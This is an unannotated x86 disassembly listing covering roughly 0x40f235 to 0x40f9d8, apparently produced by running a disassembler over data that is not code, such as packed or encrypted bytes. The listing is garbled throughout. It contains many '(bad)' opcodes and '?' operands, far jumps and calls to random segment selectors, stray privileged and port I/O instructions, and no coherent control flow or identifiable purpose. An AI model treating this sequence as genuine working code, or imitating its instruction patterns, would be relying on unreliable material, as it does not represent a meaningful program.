  40f235:	mov    eax,ds:0xa4a00575
  40f23a:	pop    es
  40f23b:	xchg   ebx,eax
  40f23c:	leave  
  40f23d:	xchg   esi,eax
  40f23e:	leave  
  40f23f:	jbe    0x40f28c
  40f241:	sub    DWORD PTR [eax-0x3783aae6],edi
  40f247:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f248:	pop    ds
  40f249:	mov    eax,0x30b8f87a
  40f24e:	sub    BYTE PTR [edi+0x59],al
  40f251:	sbb    esi,DWORD PTR [eax+0x65ec884]
  40f257:	mov    esi,0xfdbd626d
  40f25c:	or     al,0x93
  40f25e:	fstp   TBYTE PTR [esi-0x61]
  40f261:	aaa    
  40f262:	push   ds
  40f263:	inc    ebx
  40f264:	push   edx
  40f265:	iret   
  40f266:	shl    eax,0x72
  40f269:	lea    ebx,[edx+0x4e38d62d]
  40f26f:	jmp    0x4b8e:0x7b2eb407
  40f276:	push   cs
  40f277:	xchg   edx,eax
  40f278:	cwde   
  40f279:	scas   eax,DWORD PTR es:[edi]
  40f27a:	loope  0x40f29e
  40f27c:	fs pop esp
  40f27e:	lock lahf 
  40f280:	mov    cl,0xc8
  40f282:	mov    ds:0x13846256,eax
  40f287:	or     dh,BYTE PTR [eax+ebp*2]
  40f28a:	mov    ebp,0x4acbcac6
  40f28f:	pop    esi
  40f290:	jo     0x40f2eb
  40f292:	dec    ecx
  40f293:	xlat   BYTE PTR ds:[ebx]
  40f294:	adc    eax,0x73578172
  40f299:	pusha  
  40f29a:	push   ecx
  40f29b:	inc    ebp
  40f29c:	ja     0x40f2e6
  40f29e:	neg    DWORD PTR [ebx+eiz*8]
  40f2a1:	aaa    
  40f2a2:	out    dx,al
  40f2a3:	jb     0x40f2c7
  40f2a5:	add    ebx,edi
  40f2a7:	aas    
  40f2a8:	xchg   BYTE PTR [edx],dl
  40f2aa:	adc    dl,BYTE PTR [ebp-0x13ee0176]
  40f2b0:	adc    esi,edi
  40f2b2:	sub    DWORD PTR [edx-0x6e],eax
  40f2b5:	dec    eax
  40f2b6:	xchg   esp,eax
  40f2b7:	aas    
  40f2b8:	xchg   esi,eax
  40f2b9:	test   DWORD PTR [ecx-0x8],0xcaff283a
  40f2c0:	mov    al,0x58
  40f2c2:	ret    0x1302
  40f2c5:	push   esp
  40f2c6:	neg    DWORD PTR [ecx]
  40f2c8:	jmp    0x893f:0x176a44ee
  40f2cf:	inc    esi
  40f2d0:	or     al,0x2e
  40f2d2:	pop    ecx
  40f2d3:	mov    ecx,0x642e6a7a
  40f2d8:	retf   
  40f2d9:	pop    edi
  40f2da:	shl    BYTE PTR [esi-0x6c],0xf0
  40f2de:	cmp    eax,0x89b4253e
  40f2e3:	pop    ecx
  40f2e4:	sbb    esp,DWORD PTR [eax+0x2bdb96be]
  40f2ea:	rol    BYTE PTR [edx-0x2620d998],1
  40f2f0:	and    BYTE PTR [ebx],dh
  40f2f2:	add    dl,dh
  40f2f4:	mov    bh,0x47
  40f2f6:	pusha  
  40f2f7:	sbb    al,0x4
  40f2f9:	xchg   DWORD PTR [edi-0x44],ecx
  40f2fc:	mov    DWORD PTR [esp+ecx*2-0x7dc5eaf6],edx
  40f303:	mov    edi,0x2f94fe4c
  40f308:	aaa    
  40f309:	cmp    cl,0xb5
  40f30c:	or     DWORD PTR [ebp+eiz*2-0x61],ecx
  40f310:	jno    0x40f2ed
  40f312:	sar    BYTE PTR [ecx+0x2d173150],0x55
  40f319:	adc    BYTE PTR [ecx+eax*4],dh
  40f31c:	pop    ecx
  40f31d:	dec    edx
  40f31e:	jne    0x40f349
  40f320:	push   0x1b
  40f322:	pop    ebx
  40f323:	into   
  40f324:	xor    esi,DWORD PTR [esp+eax*8-0x415a5631]
  40f32b:	mov    cl,0xa1
  40f32d:	loopne 0x40f309
  40f32f:	cmp    ebx,DWORD PTR [edx+0x5a]
  40f332:	test   al,0x6b
  40f334:	add    ah,cl
  40f336:	or     eax,0x1e6b6f30
  40f33b:	add    BYTE PTR [ecx+eiz*2],0x55
  40f33f:	into   
  40f340:	fld    st(2)
  40f342:	je     0x40f38e
  40f344:	jo     0x40f330
  40f346:	ja     0x40f313
  40f348:	mov    ?,WORD PTR [ecx-0x7b2cbeb0]
  40f34e:	loopne 0x40f353
  40f350:	daa    
  40f351:	dec    eax
  40f352:	ss into 
  40f354:	aam    0x7f
  40f356:	repz push cs
  40f358:	aad    0x96
  40f35a:	push   ds
  40f35b:	(bad)  
  40f35c:	xor    eax,0x7673bc27
  40f361:	sbb    BYTE PTR [ecx+0x7b11d8fb],bh
  40f367:	inc    ebp
  40f368:	or     eax,0x921ce701
  40f36d:	sub    eax,0x4eac1359
  40f372:	mov    bl,0xf5
  40f374:	dec    eax
  40f375:	not    BYTE PTR [esi]
  40f377:	mov    ebx,0x83ae9906
  40f37c:	dec    esp
  40f37d:	dec    esi
  40f37e:	mov    ah,0x39
  40f380:	mov    DWORD PTR cs:[ebp-0x79c7febf],edi
  40f387:	test   al,0xda
  40f389:	mov    ecx,0x39f79702
  40f38e:	inc    edi
  40f38f:	daa    
  40f390:	mov    eax,ds:0x297c058e
  40f395:	imul   ebp,DWORD PTR [esi+0x2f],0xdc867b87
  40f39c:	sahf   
  40f39d:	mov    eax,0xff83d6f8
  40f3a2:	fdiv   st(7),st
  40f3a4:	push   es
  40f3a5:	mov    esi,DWORD PTR [ecx]
  40f3a7:	push   ds
  40f3a8:	shl    BYTE PTR [edi*1+0x5b45bb96],cl
  40f3af:	out    dx,eax
  40f3b0:	mov    cl,0x76
  40f3b2:	xchg   esp,eax
  40f3b3:	sub    eax,DWORD PTR [edx-0x46]
  40f3b6:	gs jg  0x40f371
  40f3b9:	js     0x40f3fc
  40f3bb:	pop    edx
  40f3bc:	mov    ebp,0xffc73579
  40f3c1:	das    
  40f3c2:	clc    
  40f3c3:	add    ebx,DWORD PTR [edx]
  40f3c5:	xchg   ebp,eax
  40f3c6:	rcl    BYTE PTR [eax],cl
  40f3c8:	xchg   BYTE PTR [ebx+0x43],bl
  40f3cb:	outs   dx,BYTE PTR ds:[esi]
  40f3cc:	dec    esp
  40f3cd:	arpl   bx,cx
  40f3cf:	mov    ds:0xa19ac2e9,al
  40f3d4:	dec    ebp
  40f3d5:	fadd   QWORD PTR [ebp+0x38eb0cee]
  40f3db:	pop    esi
  40f3dc:	dec    ebp
  40f3dd:	sub    bl,cl
  40f3df:	adc    al,0xc1
  40f3e1:	into   
  40f3e2:	mov    ah,0xa8
  40f3e4:	push   edx
  40f3e5:	dec    edx
  40f3e6:	retf   
  40f3e7:	add    DWORD PTR [ebp-0x44],0xffffffdf
  40f3eb:	sub    BYTE PTR [eax+ebp*4+0x3a],ch
  40f3ef:	fidivr DWORD PTR [edi-0x2eeb8e0f]
  40f3f5:	ins    BYTE PTR es:[edi],dx
  40f3f6:	fstp   TBYTE PTR [ebp-0x3eeba1d5]
  40f3fc:	jo     0xa76ec787
  40f402:	ja     0x40f420
  40f404:	pop    ss
  40f405:	popf   
  40f406:	pop    ebx
  40f407:	push   cs
  40f408:	(bad)  
  40f409:	pop    ebx
  40f40a:	adc    cl,BYTE PTR [eax+0x5e]
  40f40d:	mov    BYTE PTR [ebx+ecx*8],bh
  40f410:	push   ebp
  40f411:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f412:	sub    al,0xf2
  40f414:	push   ebx
  40f415:	inc    esp
  40f416:	lea    edi,[ecx+ebp*8]
  40f419:	sbb    BYTE PTR [eax+ebp*8-0x74],0xcb
  40f41e:	sbb    al,0xa2
  40f420:	retf   
  40f421:	adc    al,0x78
  40f423:	std    
  40f424:	retf   0xc3b0
  40f427:	scas   eax,DWORD PTR es:[edi]
  40f428:	xor    BYTE PTR ds:[edi+edx*1],dl
  40f42c:	je     0x40f3bb
  40f42e:	cmp    BYTE PTR [esi-0x31],cl
  40f431:	jne    0x40f44c
  40f433:	in     al,dx
  40f434:	fistp  QWORD PTR [edx+0x434ca750]
  40f43a:	fidivr DWORD PTR [ebx+0x6c055293]
  40f440:	in     al,dx
  40f441:	repnz mov al,ds:0x33b3b64d
  40f447:	push   es
  40f448:	adc    al,0x9a
  40f44a:	ret    0xe9bc
  40f44d:	scas   eax,DWORD PTR es:[edi]
  40f44e:	pop    ss
  40f44f:	mov    esp,0xa682ccdb
  40f454:	lods   al,BYTE PTR ds:[esi]
  40f455:	jg     0x40f49e
  40f457:	(bad)  
  40f458:	jbe    0x40f420
  40f45a:	into   
  40f45b:	or     edx,DWORD PTR [eax-0x1c71af04]
  40f461:	call   0xfbc9:0x4356f1f6
  40f468:	rol    BYTE PTR ds:0x983e0cf,1
  40f46e:	jmp    DWORD PTR [ebp+edx*4-0x3b8d5304]
  40f475:	(bad)  
  40f476:	pop    ecx
  40f477:	jge    0x40f477
  40f479:	push   ss
  40f47a:	aam    0xaf
  40f47c:	push   edi
  40f47d:	xchg   edi,eax
  40f47e:	or     al,0xf9
  40f480:	rcr    BYTE PTR [esp+edi*8+0x478a0c72],1
  40f487:	sbb    esp,0x29
  40f48a:	xchg   ecx,eax
  40f48b:	sub    BYTE PTR [ebx-0x42da4bfb],dl
  40f491:	mov    edx,0xcb61c32
  40f496:	(bad)  [edi]
  40f498:	mov    ecx,0xef0e02d6
  40f49d:	jmp    0xccbf:0xae5cf452
  40f4a4:	and    al,0xab
  40f4a6:	loop   0x40f4ee
  40f4a8:	gs mov ch,0x9c
  40f4ab:	bound  edi,QWORD PTR [esp+ecx*4+0x4308c9ea]
  40f4b2:	push   ss
  40f4b3:	push   ss
  40f4b4:	out    0x57,al
  40f4b6:	test   al,0x40
  40f4b8:	(bad)  
  40f4b9:	out    0x7c,eax
  40f4bb:	xor    al,0xf6
  40f4bd:	xchg   DWORD PTR [esi+0x2b],eax
  40f4c0:	xor    cl,ch
  40f4c2:	or     al,0xcd
  40f4c4:	xchg   BYTE PTR [ecx-0x7b],dh
  40f4c7:	sub    dh,al
  40f4c9:	(bad)  
  40f4ca:	int    0x4
  40f4cc:	cmp    BYTE PTR [ecx+0x78],bl
  40f4cf:	popw   ds
  40f4d1:	sub    edx,ebp
  40f4d3:	ror    DWORD PTR [eax-0x16688052],0x23
  40f4da:	(bad)  
  40f4db:	(bad)  
  40f4dd:	(bad)  
  40f4df:	sub    eax,0x956c08ca
  40f4e4:	shl    dl,0xa0
  40f4e7:	cli    
  40f4e8:	adc    edx,esi
  40f4ea:	clc    
  40f4eb:	sti    
  40f4ec:	or     BYTE PTR [esp+esi*8-0x61350b75],0x1d
  40f4f4:	mov    WORD PTR [ecx+0x5530cbf6],?
  40f4fa:	(bad)  
  40f4fb:	dec    esi
  40f4fc:	inc    BYTE PTR [ebp-0x50]
  40f4ff:	sub    eax,0x70a12e5c
  40f504:	int    0x83
  40f506:	pop    ss
  40f507:	icebp  
  40f508:	call   0xb71d3a46
  40f50d:	loop   0x40f53f
  40f50f:	nop
  40f510:	jmp    0x674957d8
  40f515:	mov    bh,0x98
  40f517:	jmp    0xf466:0x2686c77c
  40f51e:	mov    esi,0xb57c3a0f
  40f523:	in     eax,dx
  40f524:	das    
  40f525:	outs   dx,BYTE PTR ds:[esi]
  40f526:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f527:	and    edx,ebx
  40f529:	push   ebx
  40f52a:	adc    eax,0x9614e406
  40f52f:	es jg  0x40f4dc
  40f532:	xor    BYTE PTR [edi-0x4474bb67],dl
  40f538:	sub    al,0x1a
  40f53a:	xchg   ebx,eax
  40f53b:	cmp    esi,eax
  40f53d:	iret   
  40f53e:	push   ecx
  40f53f:	mov    DWORD PTR ds:0xab85c9e4,edx
  40f545:	sar    BYTE PTR [edx-0x1],cl
  40f548:	stos   DWORD PTR es:[edi],eax
  40f549:	push   ss
  40f54a:	test   BYTE PTR [edi-0x78],ch
  40f54d:	or     bh,cl
  40f54f:	jnp    0x40f500
  40f551:	cs mov cl,0xf9
  40f554:	call   0x1647:0x8e4f555b
  40f55b:	(bad)  
  40f55e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f55f:	repz mov cl,0xe5
  40f562:	add    al,ch
  40f564:	xchg   ecx,eax
  40f565:	cmp    BYTE PTR [ebp+edi*1-0x2ff05c70],al
  40f56c:	cmp    eax,0x264c20d8
  40f571:	jne    0x40f509
  40f573:	outs   dx,BYTE PTR ds:[esi]
  40f574:	inc    DWORD PTR [esi]
  40f576:	xor    eax,0xd2d73be7
  40f57b:	call   0x654f:0x3c9db113
  40f582:	or     al,0xe3
  40f584:	jmp    0x5849:0xeea51585
  40f58b:	inc    BYTE PTR [ecx+0x2b]
  40f58e:	push   0xa084b4b9
  40f593:	add    ch,BYTE PTR [edi]
  40f595:	into   
  40f596:	cld    
  40f597:	imul   eax,ecx,0xe
  40f59a:	sub    DWORD PTR ds:0xcff2d161,ebx
  40f5a0:	xor    ecx,esp
  40f5a2:	jns    0x40f5a6
  40f5a4:	push   esi
  40f5a5:	push   ebp
  40f5a6:	xor    eax,0x8aef8582
  40f5ab:	pop    ebx
  40f5ac:	push   edi
  40f5ad:	and    al,0xd9
  40f5af:	test   DWORD PTR [edx],esi
  40f5b1:	out    dx,al
  40f5b2:	mov    cl,0x7b
  40f5b4:	bound  ebp,QWORD PTR ss:[esi+0x5f9aada]
  40f5bb:	stos   DWORD PTR es:[edi],eax
  40f5bc:	sub    cl,al
  40f5be:	out    0xab,eax
  40f5c0:	jne    0x40f60b
  40f5c2:	cs mov ecx,0xce44bac2
  40f5c8:	lds    esi,FWORD PTR [ebp+0x51]
  40f5cb:	dec    eax
  40f5cc:	mov    bl,0xf5
  40f5ce:	rcr    esp,0xe7
  40f5d1:	adc    BYTE PTR [ebp+esi*4+0x3e],ah
  40f5d5:	mov    ds:0x826d4f78,eax
  40f5da:	popa   
  40f5db:	mov    ecx,0xcbd7054a
  40f5e0:	push   0x65
  40f5e2:	pop    ebx
  40f5e3:	pop    ebx
  40f5e4:	les    ebp,FWORD PTR [eax]
  40f5e6:	retf   
  40f5e7:	dec    esi
  40f5e8:	gs in  al,dx
  40f5ea:	ins    DWORD PTR es:[edi],dx
  40f5eb:	jmp    0xe80f:0x32a33411
  40f5f2:	dec    ebp
  40f5f3:	pusha  
  40f5f4:	outs   dx,DWORD PTR ds:[esi]
  40f5f5:	cld    
  40f5f6:	iret   
  40f5f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5f8:	mov    bh,0xa2
  40f5fa:	jae    0x40f5b0
  40f5fc:	adc    ebx,esp
  40f5fe:	sub    al,0x1b
  40f600:	pop    ds
  40f601:	aam    0xf4
  40f603:	sub    DWORD PTR ss:[esi],ebp
  40f606:	repz sub cl,BYTE PTR [edi-0x23e0b578]
  40f60d:	loop   0x40f60f
  40f60f:	repnz ss push esi
  40f612:	xchg   ebx,eax
  40f613:	repnz rcr BYTE PTR [ebp+0x38],0x86
  40f618:	jbe    0x40f60f
  40f61a:	push   edx
  40f61b:	cmc    
  40f61c:	fcom   QWORD PTR [ecx-0x38]
  40f61f:	jp     0x40f601
  40f621:	ror    DWORD PTR [edx-0x402bca9d],cl
  40f627:	retf   0xe1c
  40f62a:	aam    0xab
  40f62c:	xchg   esi,eax
  40f62d:	sysret 
  40f62f:	adc    DWORD PTR ds:0xc4fd53c7,ebx
  40f635:	xlat   BYTE PTR ds:[ebx]
  40f636:	les    edx,FWORD PTR [ebp+0x3adc7e2a]
  40f63c:	fwait
  40f63d:	outs   dx,BYTE PTR ds:[esi]
  40f63e:	cmp    al,0x31
  40f640:	pop    edx
  40f641:	lea    esp,[ebx+0xd145615]
  40f647:	adc    al,0xeb
  40f649:	(bad)  
  40f64a:	imul   esi,DWORD PTR [ebp-0x64a4a3bb],0xf60d09aa
  40f654:	in     eax,0xd7
  40f656:	or     BYTE PTR [eax+edi*2+0x1849441f],ch
  40f65d:	jp     0x40f652
  40f65f:	push   es
  40f660:	mov    DWORD PTR [edx],ebp
  40f662:	stos   DWORD PTR es:[edi],eax
  40f663:	cmp    al,0x25
  40f665:	adc    DWORD PTR [ebp+0x71],0x62
  40f669:	and    dl,BYTE PTR [edi+0x794fa84]
  40f66f:	shl    BYTE PTR [edi],1
  40f671:	loop   0x40f5f9
  40f673:	add    bh,BYTE PTR [ecx]
  40f675:	fwait
  40f676:	and    ah,dh
  40f678:	xchg   DWORD PTR [esi],ebp
  40f67a:	and    DWORD PTR [eax-0x43],ebp
  40f67d:	stc    
  40f67e:	fsub   st,st(2)
  40f680:	and    eax,0x6c92419e
  40f685:	add    eax,0xe4a532a0
  40f68a:	sbb    al,0x7a
  40f68c:	or     al,0x66
  40f68e:	xchg   ebp,eax
  40f68f:	add    al,0x81
  40f691:	hlt    
  40f692:	inc    ebx
  40f693:	lds    eax,FWORD PTR [edi]
  40f695:	sbb    DWORD PTR [ebx+0xf],esi
  40f698:	adc    al,0x75
  40f69a:	jl     0x40f62b
  40f69c:	xor    BYTE PTR [ecx-0x1374b2ed],bh
  40f6a2:	sbb    esi,DWORD PTR [edi+0x279d6b78]
  40f6a8:	imul   edx,edx,0xa9c2d52f
  40f6ae:	call   0xf32851ef
  40f6b3:	daa    
  40f6b4:	pop    edi
  40f6b5:	adc    BYTE PTR [eax+0x689ecf29],ch
  40f6bb:	dec    edi
  40f6bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f6bd:	cmp    al,bh
  40f6bf:	jmp    0x31e4:0x3b301dd7
  40f6c6:	sbb    eax,0x211e76b6
  40f6cb:	test   al,0xe4
  40f6cd:	xchg   BYTE PTR [esi-0x24b6972],cl
  40f6d3:	fcomp  DWORD PTR [eax-0x39]
  40f6d6:	xchg   esi,eax
  40f6d7:	test   BYTE PTR [ebp-0x5f1e8f89],ch
  40f6dd:	imul   ebx,DWORD PTR [ebp+0x33],0xffffffcc
  40f6e1:	into   
  40f6e2:	outs   dx,BYTE PTR ds:[esi]
  40f6e3:	mov    BYTE PTR [ecx+0x3f],dh
  40f6e6:	jo     0x40f71c
  40f6e8:	mov    ebx,0x8706a09e
  40f6ed:	mov    ecx,0xd8a7ed4f
  40f6f2:	sti    
  40f6f3:	div    esp
  40f6f5:	cmc    
  40f6f6:	mov    esp,0x67e3f409
  40f6fb:	call   0x6fb9:0x438b0313
  40f702:	add    al,0x26
  40f704:	aam    0x50
  40f706:	or     al,0x1e
  40f708:	sbb    BYTE PTR [ecx],al
  40f70a:	sbb    esp,DWORD PTR [ecx+0x19]
  40f70d:	cwde   
  40f70e:	xchg   cl,bl
  40f710:	mov    ecx,0xd7b8a41f
  40f715:	adc    eax,0xad92b3d9
  40f71a:	sub    ch,bl
  40f71c:	in     eax,dx
  40f71d:	or     DWORD PTR [eax+0x29],eax
  40f720:	sbb    ecx,esp
  40f722:	shr    dh,1
  40f724:	test   eax,0xd747fd3c
  40f729:	jl     0x40f714
  40f72b:	sahf   
  40f72c:	xchg   esi,eax
  40f72d:	int3   
  40f72e:	sub    edi,eax
  40f730:	push   cs
  40f731:	rcl    DWORD PTR [edi-0x7e],1
  40f734:	dec    esi
  40f735:	iret   
  40f736:	xor    al,0x5b
  40f738:	das    
  40f739:	ret    
  40f73a:	cmp    ah,BYTE PTR [esi+0x3a905b85]
  40f740:	or     al,0xbc
  40f742:	retf   
  40f743:	(bad)  
  40f744:	xlat   BYTE PTR ds:[ebx]
  40f745:	cwde   
  40f746:	add    eax,0xb3b36b05
  40f74c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f74d:	or     esi,DWORD PTR [edi]
  40f74f:	addr16 iret 
  40f751:	or     DWORD PTR [esi+0x17597ead],0xa36f3a2c
  40f75b:	push   ss
  40f75c:	push   ebx
  40f75d:	xchg   ecx,eax
  40f75e:	jmp    0x40f77d
  40f760:	lock pop DWORD PTR [edx+eax*2+0x4e]
  40f765:	prefetch BYTE PTR [edx-0x10]
  40f769:	mov    dl,0xbb
  40f76b:	mov    al,0x15
  40f76d:	add    eax,0xb0b0e842
  40f772:	sti    
  40f773:	je     0x40f727
  40f775:	in     al,0x38
  40f777:	and    bl,ch
  40f779:	scas   eax,DWORD PTR es:[edi]
  40f77a:	cmp    DWORD PTR [edi],ebx
  40f77c:	pop    edi
  40f77d:	imul   eax,DWORD PTR [eax],0x8727ebc8
  40f783:	adc    BYTE PTR [ebp+eax*8-0x3a205e02],al
  40f78a:	stos   DWORD PTR es:[edi],eax
  40f78b:	js     0x40f795
  40f78d:	test   BYTE PTR [ebp+0x10df8d24],ch
  40f793:	or     al,BYTE PTR [esi+0x2f]
  40f796:	pop    edi
  40f797:	xchg   ebp,eax
  40f798:	ror    BYTE PTR [ebx+0x335a0d59],0x4e
  40f79f:	jno    0x40f800
  40f7a1:	or     esi,DWORD PTR [ecx]
  40f7a3:	sub    ebp,DWORD PTR [edx]
  40f7a5:	and    BYTE PTR [edx],bl
  40f7a7:	mov    ?,WORD PTR [esi+0x1a7ce7f2]
  40f7ad:	adc    eax,0x8a009cec
  40f7b2:	mov    ebx,0xc7925dc7
  40f7b7:	and    esi,DWORD PTR [esi-0x5a]
  40f7ba:	mov    esp,0x8fbfc6fb
  40f7bf:	dec    esp
  40f7c0:	adc    cl,BYTE PTR [ecx]
  40f7c2:	sub    edx,DWORD PTR [esi-0x59]
  40f7c5:	pushfw 
  40f7c7:	lds    eax,FWORD PTR [edx]
  40f7c9:	scas   eax,DWORD PTR es:[edi]
  40f7ca:	push   es
  40f7cb:	mov    cl,0x78
  40f7cd:	dec    esi
  40f7ce:	jge    0x40f776
  40f7d0:	jae    0x40f810
  40f7d2:	sub    ebp,DWORD PTR [ecx]
  40f7d4:	aad    0xe
  40f7d6:	ss dec esi
  40f7d9:	xor    BYTE PTR [edx],dh
  40f7db:	test   eax,0xfc888e17
  40f7e0:	xchg   edx,eax
  40f7e1:	dec    esp
  40f7e2:	hlt    
  40f7e3:	outs   dx,DWORD PTR ds:[esi]
  40f7e4:	stos   DWORD PTR es:[edi],eax
  40f7e5:	daa    
  40f7e6:	xchg   edx,eax
  40f7e7:	lea    ebx,ds:0x31f76f30
  40f7ed:	sti    
  40f7ee:	pop    ebx
  40f7ef:	in     eax,dx
  40f7f0:	jge    0x40f7e1
  40f7f2:	pop    es
  40f7f3:	sbb    ah,ch
  40f7f5:	xor    al,0x1a
  40f7f7:	mov    ds:0x786878dd,eax
  40f7fc:	lea    esp,[ebx]
  40f7fe:	lahf   
  40f7ff:	sub    BYTE PTR [esi+esi*1-0x16d04e3a],dh
  40f806:	les    esi,FWORD PTR [edx]
  40f808:	add    dh,dh
  40f80a:	dec    ecx
  40f80b:	mov    dl,0x46
  40f80d:	aam    0x29
  40f80f:	push   es
  40f810:	shl    DWORD PTR [eax+0x31],0xd
  40f814:	cli    
  40f815:	pop    ecx
  40f816:	lock rcr esp,1
  40f819:	inc    esp
  40f81a:	shl    cl,cl
  40f81c:	xor    BYTE PTR [edi-0x5e349d32],bh
  40f822:	and    dl,BYTE PTR [ecx+ecx*1-0x67]
  40f826:	aad    0xf1
  40f828:	hlt    
  40f829:	out    dx,eax
  40f82a:	in     eax,0x81
  40f82c:	and    eax,0x10c43b5f
  40f831:	and    al,0xfa
  40f833:	pop    esi
  40f834:	sbb    eax,0x45447938
  40f839:	imul   ebx,DWORD PTR [ebx-0x52e9682d],0xffffffb3
  40f840:	outs   dx,DWORD PTR ds:[esi]
  40f841:	lods   al,BYTE PTR ds:[esi]
  40f842:	push   0x1487fc3e
  40f847:	xchg   esi,eax
  40f848:	push   ds
  40f849:	jne    0x40f8c9
  40f84b:	pusha  
  40f84c:	sub    al,0xf
  40f84e:	aad    0x50
  40f850:	push   ds
  40f851:	dec    eax
  40f852:	jge    0x40f896
  40f854:	test   BYTE PTR [ecx],ah
  40f856:	vpaddw xmm4,xmm2,XMMWORD PTR [edx+0x34]
  40f85b:	out    dx,eax
  40f85c:	pop    eax
  40f85d:	pop    ds
  40f85e:	and    al,0x2e
  40f860:	pop    eax
  40f861:	jae    0x40f80d
  40f863:	xchg   ebx,eax
  40f864:	ror    DWORD PTR [ebx-0x14373771],0xdb
  40f86b:	icebp  
  40f86c:	mov    ?,WORD PTR [ebx-0x36565e0f]
  40f872:	push   cs
  40f873:	add    dl,dh
  40f875:	and    eax,0xcc859103
  40f87a:	lods   al,BYTE PTR ds:[esi]
  40f87b:	mov    ah,0x84
  40f87d:	jg     0x40f870
  40f87f:	add    eax,0x527b2635
  40f884:	ja     0x40f8c4
  40f886:	push   0xffffffbe
  40f888:	xor    eax,0x569c22fc
  40f88d:	popf   
  40f88e:	pop    eax
  40f88f:	pop    DWORD PTR [edx+0x30]
  40f892:	cwde   
  40f893:	dec    ecx
  40f894:	jb     0x40f89f
  40f896:	mov    DWORD PTR [edx-0x7d],edi
  40f899:	jmp    0x40f83c
  40f89b:	scas   al,BYTE PTR es:[edi]
  40f89c:	popa   
  40f89d:	imul   esp,DWORD PTR [ebx],0xb2391abe
  40f8a3:	mov    eax,ds:0xed142c47
  40f8a8:	dec    eax
  40f8a9:	iret   
  40f8aa:	daa    
  40f8ab:	(bad)  [ebx+0x38]
  40f8ae:	mov    al,BYTE PTR [ecx]
  40f8b0:	cmp    dl,0xda
  40f8b3:	sbb    al,0xad
  40f8b5:	add    dh,dl
  40f8b7:	jecxz  0x40f899
  40f8b9:	lock cmp al,BYTE PTR [esi]
  40f8bc:	arpl   WORD PTR ds:0xee323b54,bx
  40f8c2:	mov    dl,0xed
  40f8c4:	test   DWORD PTR [edx-0x542c50c],ebx
  40f8ca:	jmp    0x3c4e:0x7190dcb1
  40f8d1:	xchg   dh,bh
  40f8d3:	aad    0x10
  40f8d5:	pop    eax
  40f8d6:	lea    ecx,[esi]
  40f8d8:	(bad)  
  40f8d9:	repnz push ds
  40f8db:	jbe    0x40f8ff
  40f8dd:	xor    al,0x3c
  40f8df:	sub    eax,0x476fab18
  40f8e4:	(bad)
  40f8e8:	mov    BYTE PTR ds:0x5b31f4e9,cl
  40f8ee:	lds    esi,FWORD PTR [ebx+ebx*8]
  40f8f1:	dec    BYTE PTR [esi-0x6b]
  40f8f4:	int3   
  40f8f5:	add    al,0x14
  40f8f7:	push   0xffffffdf
  40f8f9:	or     BYTE PTR [ebx-0x41],dh
  40f8fc:	shl    BYTE PTR [ebx-0x8],cl
  40f8ff:	dec    esp
  40f900:	jle    0x40f92a
  40f902:	mov    dl,0xf
  40f904:	imul   esp,DWORD PTR [edi+0x5f792902],0x33b75c58
  40f90e:	push   ebp
  40f90f:	stc    
  40f910:	pop    ebp
  40f911:	jecxz  0x40f8d7
  40f913:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f914:	outs   dx,DWORD PTR ds:[esi]
  40f915:	and    al,bl
  40f917:	xchg   edi,eax
  40f918:	or     bh,bh
  40f91a:	mov    esp,0x1f14e15d
  40f91f:	lods   al,BYTE PTR ds:[esi]
  40f920:	int    0x7e
  40f922:	(bad)  
  40f924:	or     DWORD PTR [ecx-0x76],edi
  40f927:	sub    DWORD PTR [ebx],ecx
  40f929:	adc    BYTE PTR ds:[edi+0xbe01287],bl
  40f930:	int3   
  40f931:	jge    0x40f927
  40f933:	test   BYTE PTR [eax+0x2b],al
  40f936:	mov    al,ds:0xfae40b48
  40f93b:	fs pop edi
  40f93d:	mov    ah,0x10
  40f93f:	jne    0x40f8cc
  40f941:	add    al,BYTE PTR [ecx+ecx*2-0xf]
  40f945:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f946:	in     al,0x60
  40f948:	sbb    ebx,edi
  40f94a:	push   ds
  40f94b:	aaa    
  40f94c:	mov    bl,ch
  40f94e:	out    0x6f,al
  40f950:	retf   
  40f951:	out    dx,al
  40f952:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f953:	stc    
  40f954:	inc    esi
  40f955:	sbb    al,0xe2
  40f957:	jmp    0xe1fa170a
  40f95c:	retf   
  40f95d:	and    BYTE PTR [ebx],bl
  40f95f:	cmp    eax,0xa6965a1e
  40f964:	sbb    bh,BYTE PTR [eiz*1-0x1287ecc0]
  40f96b:	shl    DWORD PTR [ebx+0xf6fd984],1
  40f971:	out    dx,eax
  40f972:	adc    edi,edi
  40f974:	popf   
  40f975:	in     eax,dx
  40f976:	xor    ch,BYTE PTR [ebp-0x3c72f722]
  40f97c:	stos   BYTE PTR es:[edi],al
  40f97d:	cdq    
  40f97e:	mov    WORD PTR [ecx-0x502f3a1],ds
  40f984:	retf   0x4872
  40f987:	add    bh,BYTE PTR [ebp-0x72d3ef29]
  40f98d:	out    dx,al
  40f98e:	add    bl,BYTE PTR [edi-0x60]
  40f991:	xchg   DWORD PTR [esi-0x19e1e4a8],edi
  40f997:	rol    ch,0x7e
  40f99a:	fstp   DWORD PTR [ebp+edx*4+0x60]
  40f99e:	pop    edx
  40f99f:	and    ebp,esi
  40f9a1:	js     0x40fa0a
  40f9a3:	xlat   BYTE PTR ds:[ebx]
  40f9a4:	sbb    BYTE PTR [edi-0x259a00cc],bl
  40f9aa:	xchg   ebp,eax
  40f9ab:	out    0x1a,al
  40f9ad:	retf   
  40f9ae:	sar    BYTE PTR [ebx],cl
  40f9b0:	clc    
  40f9b1:	outs   dx,BYTE PTR ds:[esi]
  40f9b2:	jbe    0x40f9b7
  40f9b4:	es mov ch,0x5b
  40f9b7:	mov    ebp,cs
  40f9b9:	mov    eax,0x49ee8b8
  40f9be:	push   DWORD PTR [esi-0x598464ad]
  40f9c4:	sub    BYTE PTR [edx-0x5de22417],dl
  40f9ca:	jne    0x40fa26
  40f9cc:	ret    
  40f9cd:	es mov ebx,0x65c97f2d
  40f9d3:	xor    dh,BYTE PTR [edx]
  40f9d5:	dec    edx
  40f9d6:	cmp    BYTE PTR [edi],cl
  40f9d8:	das    
